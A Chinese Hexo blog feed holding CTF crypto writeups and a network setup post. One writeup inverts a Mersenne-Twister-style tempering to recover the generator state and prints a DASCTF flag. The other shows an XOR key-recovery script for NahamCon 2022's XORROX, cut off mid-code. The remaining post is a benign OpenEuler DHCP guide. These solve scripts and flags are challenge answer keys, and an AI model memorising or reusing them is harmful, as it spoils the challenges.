class="hljs-number">2239219657</span>, <span class="hljs-number">1415387229</span>, <span class="hljs-number">3657507305</span>, <span class="hljs-number">3330696118</span>, <span class="hljs-number">2304219467</span>, <span class="hljs-number">3782535397</span>, <span class="hljs-number">2523926865</span>, <span class="hljs-number">173770442</span>, <span class="hljs-number">469421316</span>, <span class="hljs-number">4068724979</span>, <span class="hljs-number">567442650</span>, <span class="hljs-number">1996215573</span>, <span class="hljs-number">2071307093</span>, <span class="hljs-number">778899724</span>, <span class="hljs-number">3534102235</span>, <span class="hljs-number">1001138889</span>, <span class="hljs-number">2821812427</span>, <span class="hljs-number">591691317</span>, <span class="hljs-number">1265763678</span>, <span class="hljs-number">2241915660</span>, <span class="hljs-number">3220601768</span>, <span class="hljs-number">653090205</span>, <span class="hljs-number">2367897867</span>, <span class="hljs-number">1393909319</span>, <span class="hljs-number">2691817329</span>, <span class="hljs-number">3098049768</span>, <span class="hljs-number">117121403</span>, <span class="hljs-number">1255294678</span>, <span class="hljs-number">2272844919</span>, <span class="hljs-number">788255921</span>, <span class="hljs-number">2333869622</span>, <span class="hljs-number">4052660679</span>, <span class="hljs-number">2407095869</span>, <span class="hljs-number">2636108242</span>, <span class="hljs-number">2204717619</span>, <span class="hljs-number">1672726444</span>, <span class="hljs-number">2250826426</span>, <span class="hljs-number">258706466</span>, <span class="hljs-number">2295454699</span>, <span class="hljs-number">337308034</span>, <span class="hljs-number">3703973770</span>, <span class="hljs-number">3133498524</span>, <span class="hljs-number">22718827</span>, <span class="hljs-number">3096937679</span>, <span class="hljs-number">2039003308</span>, <span class="hljs-number">1519854757</span>, <span class="hljs-number">568184976</span>, <span class="hljs-number">1986854118</span>, <span class="hljs-number">2888207511</span>, <span class="hljs-number">822307630</span>, <span class="hljs-number">3829301724</span>, <span class="hljs-number">3198527490</span>, <span class="hljs-number">3073739663</span>, <span class="hljs-number">3043580445</span>, <span class="hljs-number">3458239370</span>, <span class="hljs-number">802145890</span>, <span class="hljs-number">376901460</span>, <span class="hljs-number">1251103099</span>, <span class="hljs-number">1143003993</span>, <span class="hljs-number">1280321148</span>, <span class="hljs-number">661386076</span>, <span class="hljs-number">3708710489</span>, <span class="hljs-number">2237151715</span>, <span class="hljs-number">3928104641</span>, <span class="hljs-number">2975550516</span>, <span class="hljs-number">1087492088</span>, <span class="hljs-number">1504028830</span>, <span class="hljs-number">61927086</span>, <span class="hljs-number">3858242888</span>, <span class="hljs-number">1916136658</span>, <span class="hljs-number">2328550074</span>, <span class="hljs-number">3032032377</span>, <span class="hljs-number">2193802260</span>, <span class="hljs-number">3311627503</span>, <span class="hljs-number">3196945045</span>, <span class="hljs-number">3396801792</span>, <span class="hljs-number">806210594</span>, <span class="hljs-number">2449941623</span>, <span class="hljs-number">2514744466</span>, <span class="hljs-number">3922130206</span>, <span class="hljs-number">3245757763</span>, <span class="hljs-number">3128328446</span>, <span class="hljs-number">2335833206</span>, <span class="hljs-number">3205660364</span>, <span class="hljs-number">3527402441</span>, <span class="hljs-number">2174241644</span>, <span class="hljs-number">1262568556</span>, <span class="hljs-number">2360103007</span>, <span class="hljs-number">2490217737</span>, <span class="hljs-number">1485100950</span>, <span class="hljs-number">3407260</span>, <span class="hljs-number">3005226942</span>, <span class="hljs-number">1355314866</span>, <span class="hljs-number">3154763465</span>, <span class="hljs-number">619881867</span>, <span class="hljs-number">2409963438</span>, <span class="hljs-number">2422269402</span>, <span class="hljs-number">205756019</span>, <span class="hljs-number">3300644241</span>, <span class="hljs-number">1157501775</span>, <span class="hljs-number">1229058028</span>, <span class="hljs-number">161050869</span>, <span class="hljs-number">969496287</span>, <span class="hljs-number">3385825249</span>, <span class="hljs-number">2557284067</span>, <span class="hljs-number">4236642714</span>, <span class="hljs-number">169094727</span>, <span class="hljs-number">2698326774</span>, <span class="hljs-number">1863176242</span>, <span class="hljs-number">3532885426</span>, <span class="hljs-number">3046403588</span>, <span class="hljs-number">3869207867</span>, <span class="hljs-number">496104150</span>, <span class="hljs-number">353604631</span>, <span class="hljs-number">1054882225</span>, <span class="hljs-number">152711981</span>, <span class="hljs-number">1362131890</span>, <span class="hljs-number">76912113</span>, <span class="hljs-number">3052177189</span>, <span class="hljs-number">3932252092</span>, <span class="hljs-number">3834713905</span>, <span class="hljs-number">2338378436</span>, <span class="hljs-number">44417325</span>, <span class="hljs-number">117723195</span>, <span class="hljs-number">1089433566</span>, <span class="hljs-number">4166617161</span>, <span class="hljs-number">2848021308</span>, <span class="hljs-number">2229619096</span>, <span class="hljs-number">319957702</span>, <span class="hljs-number">3661655667</span>, <span class="hljs-number">2809620731</span>, <span class="hljs-number">482011930</span>, <span class="hljs-number">3983483016</span>, <span class="hljs-number">82362287</span>, <span class="hljs-number">1518135562</span>, <span class="hljs-number">3490996143</span>, <span class="hljs-number">510129461</span>, <span class="hljs-number">1400609584</span>, <span class="hljs-number">2646113779</span>, <span class="hljs-number">732457215</span>, <span class="hljs-number">3735585198</span>, <span class="hljs-number">3451194227</span>, <span class="hljs-number">959269510</span>, <span class="hljs-number">244188667</span>]<br></code></pre></td></tr></table></figure><p>这里我也给出来吧，这样你们要是想做也能做了。</p><p>分析一下流程，我们最终实要得到这个<code>r.rand()</code>的值，我们才能得到flag。那么看一看rand是怎么运作的。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>可以看到，当index为0的时候，会将MT重新生成。</p><p>产生rand的时候，使用当前的index作为索引，使用MT[index]为基值进行变换最后得到我们的rand，同时index增长1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br></code></pre></td></tr></table></figure><p>在主流程的时里面，这里我们生成了624个rand。那么我们生成flag的时候，index的值是0。所以我们在生成flag的时候，MT表会先进行重新的生成。那么我们想要得到flag就得先得到对应的MT表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br></code></pre></td></tr></table></figure><p>这里可以看到，我们的y是一种循环位移异或的生成方式，而且一共有3项，是奇数项。所以这个过程是可逆的可以计算的。具体的算法可以参照一下链接:</p><p><a href="https://www.cnblogs.com/Tf1shC4T/p/15927062.html">https://www.cnblogs.com/Tf1shC4T/p/15927062.html</a></p><p>那么我们就可以得到对应的MT表。然后对这个表进行重新生成，取第一个数进行随机数生成即可得到对应的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py </span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;output.txt&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    data = <span class="hljs-built_in">eval</span>(fp.read())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">y, shift</span>):<br>    shift %= <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><br>key_right = [<span class="hljs-number">7</span>, <span class="hljs-number">19</span>]<br>key_left = [<span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br><br><br><span class="hljs-comment"># 破解右移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_first</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2r(y, key[<span class="hljs-number">0</span>]) ^ cs2r(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-comment"># 破解左移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted_second</span>(<span class="hljs-params">y, key</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        y = y ^ cs2l(y, key[<span class="hljs-number">0</span>]) ^ cs2l(y, key[<span class="hljs-number">1</span>])<br>        key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br>    <span class="hljs-keyword">return</span> y<br><br><br>MT = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        y = (MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (MT[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        MT[i] = MT[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>            MT[i] ^= <span class="hljs-number">2567483520</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">index=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> index == <span class="hljs-number">0</span>:<br>        generate()<br>    y = MT[index]<br>    y = y ^ cs2l(y, <span class="hljs-number">11</span>) ^ cs2l(y, <span class="hljs-number">15</span>)<br>    y = y ^ cs2r(y, <span class="hljs-number">7</span>) ^ cs2r(y, <span class="hljs-number">19</span>)<br>    index = (index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>    <span class="hljs-keyword">return</span> y<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    MT = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        MT.append(decrypted_second(decrypted_first(i, key_right), key_left))<br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>    flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br><br></code></pre></td></tr></table></figure><p>这里对这个解密多将两句吧。</p><p>这个其实可以使用左移右移混杂的，只是这一题不行。</p><p>这个方法的使用条件是右边异或的项数必须是奇数个，而且第一项是没有位移的。</p><p>例如下面这种情况：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>x</mi><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋙</mo><mi>p</mi><mo stretchy="false">)</mo><mo>⊕</mo><mo stretchy="false">(</mo><mi>x</mi><mo>⋘</mo><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y = x \oplus (x \ggg p) \oplus (x \lll q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋙</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">⋘</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>那么对应的解密代码就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypted</span>(<span class="hljs-params">y, key</span>):<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bitslen): <span class="hljs-comment"># bitslen表示你进行运算的位宽度，这道题里面就是32位</span><br>y = y ^ cs2r(y, p) ^ cs2l(y, q)<br>key = [k &lt;&lt; <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key]<br><span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><p>提供对应的p,q也是可以解的。</p><h1 id="一些题外话"><a class="markdownIt-Anchor" href="#一些题外话"></a> 一些题外话</h1><p>好多题目都找不到writeup，每次打完一些比赛，想看看别人是怎么写出来那些我没写出来的题，但是基本上都找不到对应的Writeup。官方writeup也基本上没有。哎，也不认识那些大佬，想要题解都要不到。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理服务器OpenEuler系统DHCP网络环境配置</title>
    <link href="/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/05/04/%E7%89%A9%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8OpenEuler%E7%B3%BB%E7%BB%9FDHCP%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>关于Taishan2280上的openeuler系统配置DHCP协议。</p><span id="more"></span><div class="note note-info">            <p>最后编辑于2022-05-05</p>          </div><p>学校有台Taishan2280服务器需要安装操作系统并且配置网络。需要安装的系统是OpenEuler。操作系统使用的是iBMC方式进行安装。这里不再赘述。</p><p>首先进入到服务器。</p><p>请在服务器对应的网口插入可以使用的网线。</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">nmcli dev status<br></code></pre></td></tr></table></figure><p>使用上述命令查看网络硬件设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli dev status<br>DEVICE      TYPE      STATE         CONNECTION<br>enp125s0f0  ethernet  已连接        web<br>virbr0      bridge    连接（外部）  virbr0<br>enp125s0f1  ethernet  已断开        --<br>enp125s0f2  ethernet  已断开        --<br>enp125s0f3  ethernet  已断开        --<br>lo          loopback  未托管        --<br>virbr0-nic  tun       未托管        --<br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>这里我的enp125s0f0已经配置好了。</p><p>选择TYPE类型为ethernet的设备。记录下其设备名称。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">nmcli device connect device_name<br></code></pre></td></tr></table></figure><p>使用上述命令启用设备连接。</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli device connect  enp125s0f1<br>错误：添加/激活新连接失败：Connection &#x27;enp125s0f1&#x27; is not available on device enp125s0f1 because device has no carrier<br></code></pre></td></tr></table></figure><p>这里由于我的一号网口没有插网线这里是失败的。所以你需要选择已插入网线的网口。网口顺序一般在服务器上都有标注。然后选择对应的设备即可。</p><p>连接完成后，使用以下指令启用DHCP。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmcli connection add type ethernet con-name connection-name ifname interface-name<br></code></pre></td></tr></table></figure><p>其中 <code>connection-name</code> 和 <code>interface-name</code>需要填写自己的配置。 <code>connection-name</code>填写自己的网络配置名称，如果没有这个网络配置，将会自动创建。</p><p><code>interface-name</code>填写你刚刚连接的网络设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli connection  add type  ethernet  con-name  web ifname  enp125s0f0<br>Connection &#x27;web&#x27; (fde481a7-0aba-432a-9201-e27603e556e8) successfully added.<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# nmcli con show<br>NAME        UUID                                  TYPE      DEVICE<br>web         fde481a7-0aba-432a-9201-e27603e556e8  ethernet  enp125s0f0<br>virbr0      dcce16f4-1934-4663-a2d1-4a908901628e  bridge    virbr0<br>enp125s0f0  a86a2809-b241-4627-9969-9bc95bb42e81  ethernet  --<br>enp125s0f1  dee58f2b-420f-4ab5-9986-66b3315c4616  ethernet  --<br>enp125s0f2  4780278c-90f1-42d5-9dfb-ee9c306e03af  ethernet  --<br>enp125s0f3  2063cbc1-644b-47f9-a151-e9812b2c5ce5  ethernet  --<br></code></pre></td></tr></table></figure><p>这样DHCP服务就在对应的设备启用。接下来只需要Reboot即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Welcome to 5.10.0-60.18.0.50.oe2203.aarch64<br><br>System information as of time:  2022年 05月 04日 星期三 18:46:55 CST<br><br>System load:    0.08<br>Processes:      700<br>Memory used:    2.1%<br>Swap used:      0%<br>Usage On:       8%<br>IP address:     192.168.1.84<br>IP address:     192.168.122.1<br>Users online:   1<br><br><br>[root@localhost ~]#<br></code></pre></td></tr></table></figure><p>可以看到我们的IP地址多了一个。这就成功了。对应网口已经分配得到了IP。</p><p>122.1那个地址是服务器iBMC地址。</p>]]></content>
    
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>OpenEuler</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NahamCon2022</title>
    <link href="/2022/05/01/NahamCon2022/"/>
    <url>/2022/05/01/NahamCon2022/</url>
    
    <content type="html"><![CDATA[<p>NahamCon CTF 2022 中 XORROX、Unimod、Baby RSA Quiz 和 Ostrich 的题解。</p><span id="more"></span><p>今天玩了玩NahamCon CTF 2022，凌晨三点开始比赛。当然，我肯定是睡觉起床了再打。</p><p>起床之后队友把热身题全扫了，我也没啥题可以做了（菜鸡一个。后面找了以下难度不大的crypto写。以下是writeup。后面我还会写一下别人的writeup，因为有些题没写出来。</p><h1 id="xorrox"><a class="markdownIt-Anchor" href="#xorrox"></a> XORROX</h1><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    flag = filp.read().strip()<br><br>key = [random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag))]<br><br>xorrox = []<br>enc = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= key[j]<br>    xorrox.append(k)<br>    enc.append(flag[i] ^ v)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> filp:<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;xorrox=&#125;</span>\n&quot;</span>)<br>    filp.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;enc=&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>可以看到是一个简单的多次异或。异或是可逆的，而且我们的key元素中的第一个也就是key[0]是不会被修改的。所以我们只需要再跑一下这个循环，把key跑出来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br>xorrox=[<span class="hljs-number">1</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">239</span>, <span class="hljs-number">4</span>, <span class="hljs-number">55</span>, <span class="hljs-number">34</span>, <span class="hljs-number">174</span>, <span class="hljs-number">79</span>, <span class="hljs-number">117</span>, <span class="hljs-number">8</span>, <span class="hljs-number">222</span>, <span class="hljs-number">123</span>, <span class="hljs-number">99</span>, <span class="hljs-number">184</span>, <span class="hljs-number">202</span>, <span class="hljs-number">95</span>, <span class="hljs-number">255</span>, <span class="hljs-number">175</span>, <span class="hljs-number">138</span>, <span class="hljs-number">150</span>, <span class="hljs-number">28</span>, <span class="hljs-number">183</span>, <span class="hljs-number">6</span>, <span class="hljs-number">168</span>, <span class="hljs-number">43</span>, <span class="hljs-number">205</span>, <span class="hljs-number">105</span>, <span class="hljs-number">92</span>, <span class="hljs-number">250</span>, <span class="hljs-number">28</span>, <span class="hljs-number">80</span>, <span class="hljs-number">31</span>, <span class="hljs-number">201</span>, <span class="hljs-number">46</span>, <span class="hljs-number">20</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>]<br>enc=[<span class="hljs-number">26</span>, <span class="hljs-number">188</span>, <span class="hljs-number">220</span>, <span class="hljs-number">228</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">36</span>, <span class="hljs-number">185</span>, <span class="hljs-number">214</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">178</span>, <span class="hljs-number">145</span>, <span class="hljs-number">47</span>, <span class="hljs-number">237</span>, <span class="hljs-number">70</span>, <span class="hljs-number">244</span>, <span class="hljs-number">149</span>, <span class="hljs-number">98</span>, <span class="hljs-number">20</span>, <span class="hljs-number">46</span>, <span class="hljs-number">187</span>, <span class="hljs-number">207</span>, <span class="hljs-number">136</span>, <span class="hljs-number">154</span>, <span class="hljs-number">231</span>, <span class="hljs-number">131</span>, <span class="hljs-number">193</span>, <span class="hljs-number">84</span>, <span class="hljs-number">148</span>, <span class="hljs-number">212</span>, <span class="hljs-number">126</span>, <span class="hljs-number">126</span>, <span class="hljs-number">226</span>, <span class="hljs-number">211</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">119</span>]<br>key = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(xorrox):<br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        k ^= xorrox[j]<br>    xorrox[i] = k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]^k), end=<span class="hljs-string">&quot;&quot;</span>)<br>    key.append(k)<br><span class="hljs-built_in">print</span>(key, <span class="hljs-built_in">len</span>(key))<br><br>    <br>xorrox = []<br><span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    k = <span class="hljs-number">1</span><br>    <span 